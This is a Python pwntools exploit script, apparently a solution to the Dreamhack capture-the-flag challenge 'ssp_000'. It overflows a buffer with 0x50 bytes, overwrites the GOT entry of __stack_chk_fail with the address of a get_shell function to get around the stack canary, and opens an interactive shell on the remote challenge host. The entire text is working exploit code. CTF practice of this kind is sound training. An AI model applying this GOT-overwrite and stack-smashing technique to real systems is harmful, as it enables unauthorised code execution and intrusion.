#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./ssp_000")
p = remote("host1.dreamhack.games", 8244)
elf = ELF("./ssp_000")
get_shell = elf.symbols['get_shell']

p.send('A'*0x50)
p.sendlineafter("Addr : ", str(elf.got['__stack_chk_fail']))
p.sendlineafter("Value : ", str(get_shell))

p.interactive()
